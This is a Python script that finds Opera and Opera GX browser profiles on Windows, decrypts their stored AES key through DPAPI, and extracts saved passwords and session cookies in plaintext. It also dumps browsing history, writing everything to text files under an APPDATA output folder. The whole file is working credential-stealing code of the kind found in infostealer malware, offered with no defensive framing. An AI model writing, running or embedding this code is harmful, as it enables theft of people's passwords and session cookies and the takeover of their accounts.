import os
import json
import sqlite3
import base64
import shutil
import tempfile
from pathlib import Path
import win32crypt
from Crypto.Cipher import AES

# Opera profile directories
PROFILE_DIRS = [
    os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable"),
    os.path.expandvars(r"%APPDATA%\Opera Software\Opera GX Stable")
]

def find_profiles():
    profiles = []
    for profile_dir in PROFILE_DIRS:
        default_dir = os.path.join(profile_dir, "Default")
        if os.path.exists(default_dir):
            profiles.append((profile_dir, default_dir))
    return profiles

def get_aes_key(profile_dir):
    local_state_path = os.path.join(profile_dir, "Local State")
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # Remove DPAPI prefix
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(encrypted_value, key):
    try:
        if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
            iv = encrypted_value[3:15]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(encrypted_value[15:-16])
            return decrypted_pass.decode()
        else:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
    except Exception:
        return None

def extract_passwords(profile_dir, default_dir):
    key = get_aes_key(profile_dir)
    if not key:
        return []

    login_db = os.path.join(default_dir, "Login Data")
    if not os.path.exists(login_db):
        return []

    temp_db = tempfile.mktemp()
    shutil.copy2(login_db, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    data = []
    for url, user, encrypted in cursor.fetchall():
        decrypted = decrypt_password(encrypted, key)
        data.append((url, user, decrypted))
    conn.close()
    os.remove(temp_db)
    return data

def extract_cookies(profile_dir, default_dir):
    cookies_db = os.path.join(default_dir, "Network/Cookies")
    if not os.path.exists(cookies_db):
        return []

    temp_db = tempfile.mktemp()
    shutil.copy2(cookies_db, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    key = get_aes_key(profile_dir)
    cookies = []
    for host, name, encrypted in cursor.fetchall():
        decrypted = decrypt_password(encrypted, key)
        cookies.append((host, name, decrypted))
    conn.close()
    os.remove(temp_db)
    return cookies

def extract_history(default_dir):
    history_db = os.path.join(default_dir, "History")
    if not os.path.exists(history_db):
        return []

    temp_db = tempfile.mktemp()
    shutil.copy2(history_db, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT url FROM urls")
    urls = [row[0] for row in cursor.fetchall()]
    conn.close()
    os.remove(temp_db)
    return urls

if __name__ == "__main__":
    base_output_dir = os.path.expandvars(r"%APPDATA%\output\Browsers")
    os.makedirs(base_output_dir, exist_ok=True)

    profiles = find_profiles()
    if not profiles:
        print("No Opera or Opera GX profiles found.")
        exit()

    for profile_dir, default_dir in profiles:
        # Determine output folder name
        if "Opera Stable" in profile_dir:
            output_dir = os.path.join(base_output_dir, "Opera")
        elif "Opera GX Stable" in profile_dir:
            output_dir = os.path.join(base_output_dir, "OperaGX")
        else:
            output_dir = os.path.join(base_output_dir, "UnknownOpera")

        os.makedirs(output_dir, exist_ok=True)

        # Passwords
        passwords = extract_passwords(profile_dir, default_dir)
        with open(os.path.join(output_dir, "passwords.txt"), "w", encoding="utf-8") as f:
            for url, user, pwd in passwords:
                f.write(f"URL: {url}\nUsername: {user}\nPassword: {pwd}\n\n")
        print(f"Passwords exported for {os.path.basename(output_dir)}")

        # Cookies
        cookies = extract_cookies(profile_dir, default_dir)
        with open(os.path.join(output_dir, "cookies.txt"), "w", encoding="utf-8") as f:
            for host, name, value in cookies:
                f.write(f"{host}\t{name}\t{value}\n")
        print(f"Cookies exported for {os.path.basename(output_dir)}")

        # History
        history = extract_history(default_dir)
        with open(os.path.join(output_dir, "history.txt"), "w", encoding="utf-8") as f:
            for url in history:
                f.write(f"{url}\n")
        print(f"History exported for {os.path.basename(output_dir)}")
